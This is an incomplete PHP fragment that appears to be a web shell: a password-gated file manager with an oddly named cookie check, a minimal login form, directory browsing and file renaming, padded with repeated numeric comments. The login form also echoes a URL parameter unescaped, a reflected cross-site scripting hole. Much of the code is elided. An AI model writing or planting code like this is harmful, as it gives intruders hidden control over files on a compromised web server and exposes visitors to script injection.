...
$pass = false;
if (isset($_COOKIE['pw_name_50818'])) {
    if(($_COOKIE['pw_name_50818']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_50818'])) {
        if(($_POST['pw_name_50818']) == $auth_key) {
            setcookie("pw_name_50818", $_POST['pw_name_50818']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_50818' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1707868580636089 1707868580677446 1707868580452895 1707868580119665
echo <<<HEAD
<!DOCTYPE html>
<html lang="en">
<head>
...
HEAD;// 1707868580636089 1707868580677446 1707868580452895 1707868580119665
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1707868580636089 1707868580677446 1707868580452895 1707868580119665
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1707868580636089 1707868580677446 1707868580452895 1707868580119665
            $name = PATH . "/" . $_GET['r'];
